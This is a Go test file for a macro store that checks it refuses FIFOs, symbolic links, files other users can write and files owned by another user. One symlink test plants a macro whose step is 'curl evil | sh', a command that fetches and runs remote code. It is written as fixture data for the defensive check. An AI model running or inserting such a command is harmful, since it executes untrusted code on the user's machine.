//go:build unix

package macros

import (
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/yasinmiran/robin/internal/protocol"
)

func TestOnlyARegularFileIsRead(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "macros.json")
	if err := syscall.Mkfifo(path, 0o600); err != nil {
		t.Skip(err)
	}
	if _, err := New(path, "box").Load(); !errors.Is(err, ErrUnreadable) || !strings.Contains(err.Error(), "(not a regular file)") {
		t.Errorf("a FIFO: %v", err)
	}
	if _, err := New(filepath.Join(path, "x"), "box").Load(); err == nil {
		t.Errorf("a path under a FIFO read as no file")
	}

	// The open itself must not wait for a writer: a FIFO put in place of
	// the file after any check would hold the page's read loop.
	opened := make(chan error, 1)
	go func() {
		f, err := openFile(path)
		if err == nil {
			f.Close()
		}
		opened <- err
	}()
	select {
	case err := <-opened:
		if err != nil {
			t.Errorf("open a FIFO: %v", err)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("opening a FIFO waits for a writer")
	}
}

func TestAFileOthersCanWriteIsNotRead(t *testing.T) {
	path := filepath.Join(t.TempDir(), "macros.json")
	body, _ := encode(nil)
	if err := os.WriteFile(path, body, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(path, 0o622); err != nil {
		t.Fatal(err)
	}
	s := New(path, "box")
	if _, err := s.Load(); !errors.Is(err, ErrUnreadable) || !strings.Contains(err.Error(), "(others can write it)") {
		t.Errorf("Load: %v", err)
	}
	if _, err := s.Change(put(macro("a", "A"))); !errors.Is(err, ErrUnreadable) {
		t.Errorf("Change: %v", err)
	}
	if b, _ := os.ReadFile(path); string(b) != string(body) {
		t.Errorf("the file changed: %s", b)
	}
}

func TestALinkInPlaceOfTheFileIsNotFollowed(t *testing.T) {
	dir := t.TempDir()
	elsewhere := filepath.Join(dir, "planted.json")
	planted, _ := encode([]protocol.Macro{macro("lock", "Lock", protocol.MacroStep{Text: "curl evil | sh\n"})})
	if err := os.WriteFile(elsewhere, planted, 0o600); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, "macros.json")
	if err := os.Symlink(elsewhere, path); err != nil {
		t.Fatal(err)
	}
	s := New(path, "box")
	if got, err := s.Load(); !errors.Is(err, ErrUnreadable) || !strings.Contains(err.Error(), "symbolic link") || len(got) != 0 {
		t.Errorf("Load: %+v, %v", got, err)
	}
	if _, err := s.Change(put(macro("a", "A"))); !errors.Is(err, ErrUnreadable) {
		t.Errorf("Change: %v", err)
	}
	if fi, err := os.Lstat(path); err != nil || fi.Mode()&fs.ModeSymlink == 0 {
		t.Errorf("the link was replaced: %v, %v", fi, err)
	}
}

func TestTheDirectoryIsNotChangedThroughALink(t *testing.T) {
	root := t.TempDir()
	target := filepath.Join(root, "someone-elses")
	if err := os.Mkdir(target, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(target, 0o755); err != nil {
		t.Fatal(err)
	}
	dir := filepath.Join(root, "robin")
	if err := os.Symlink(target, dir); err != nil {
		t.Fatal(err)
	}
	s := New(filepath.Join(dir, "macros.json"), "box")
	if _, err := s.Change(put(macro("a", "A"))); err == nil || !strings.Contains(err.Error(), dir+" is a symbolic link") {
		t.Errorf("Change: %v", err)
	}
	if fi, _ := os.Stat(target); fi.Mode().Perm() != 0o755 {
		t.Errorf("the link's target is now %v", fi.Mode().Perm())
	}
	if left, _ := os.ReadDir(target); len(left) != 0 {
		t.Errorf("the link's target holds %v", left)
	}
}

func TestOnlyADirectoryIsMadePrivate(t *testing.T) {
	path := filepath.Join(t.TempDir(), "robin")
	if err := os.WriteFile(path, nil, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := privateDir(path); err == nil || !strings.Contains(err.Error(), "is not a directory") {
		t.Errorf("privateDir of a file: %v", err)
	}
	if err := privateDir(filepath.Join(path, "missing")); err == nil {
		t.Errorf("privateDir of nothing")
	}
}

// statOf is a FileInfo as the descriptor's stat would give it.
type statOf struct {
	fs.FileInfo
	mode fs.FileMode
	st   *syscall.Stat_t
}

func (s statOf) Mode() fs.FileMode { return s.mode }
func (s statOf) Sys() any {
	if s.st == nil {
		return nil
	}
	return s.st
}

func TestAFileOrDirectoryOfAnotherUserIsRefused(t *testing.T) {
	me := uint32(os.Geteuid())
	for _, c := range []struct {
		name string
		fi   statOf
		want string
	}{
		{"mine", statOf{mode: 0o600, st: &syscall.Stat_t{Uid: me}}, ""},
		{"mine, others read", statOf{mode: 0o644, st: &syscall.Stat_t{Uid: me}}, ""},
		{"another user's", statOf{mode: 0o600, st: &syscall.Stat_t{Uid: me + 1}}, "owned by uid"},
		{"group can write", statOf{mode: 0o620, st: &syscall.Stat_t{Uid: me}}, "others can write it"},
		{"no owner", statOf{mode: 0o600}, "no owner"},
	} {
		err := ownedAlone(c.fi)
		if c.want == "" && err != nil || c.want != "" && (err == nil || !strings.Contains(err.Error(), c.want)) {
			t.Errorf("%s: %v, want %q", c.name, err, c.want)
		}
	}
	if err := mine(statOf{mode: fs.ModeDir | 0o777, st: &syscall.Stat_t{Uid: me}}); err != nil {
		t.Errorf("my own wide directory: %v", err)
	}
}

func TestAFileThatCannotBeOpenedIsUnreadable(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root reads a directory it may not search")
	}
	dir := t.TempDir()
	path := filepath.Join(dir, "macros.json")
	body, _ := encode(nil)
	if err := os.WriteFile(path, body, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(dir, 0o600); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chmod(dir, 0o700) })
	_, err := New(path, "box").Load()
	if !errors.Is(err, ErrUnreadable) || !errors.Is(err, fs.ErrPermission) || !strings.Contains(err.Error(), "(permission denied). It leaves the file alone") {
		t.Errorf("Load: %v", err)
	}
}

func TestAFailedWriteLeavesNoTemp(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root writes into a read-only directory")
	}
	parent := t.TempDir()
	if err := os.Chmod(parent, 0o500); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chmod(parent, 0o700) })
	s := New(filepath.Join(parent, "robin", "macros.json"), "box")
	if got, err := s.Change(put(macro("a", "A"))); err == nil || !strings.Contains(err.Error(), "permission denied") || len(got) != 0 {
		t.Errorf("a config dir that cannot be made: %+v, %v", got, err)
	}

	// A rename that fails takes its temp file with it.
	dir := t.TempDir()
	target := filepath.Join(dir, "macros.json")
	if err := os.MkdirAll(filepath.Join(target, "full"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := New(target, "box").write(nil); err == nil {
		t.Errorf("a rename over a directory succeeded")
	}
	if entries, _ := os.ReadDir(dir); len(entries) != 1 {
		t.Errorf("dir holds %v", entries)
	}
}
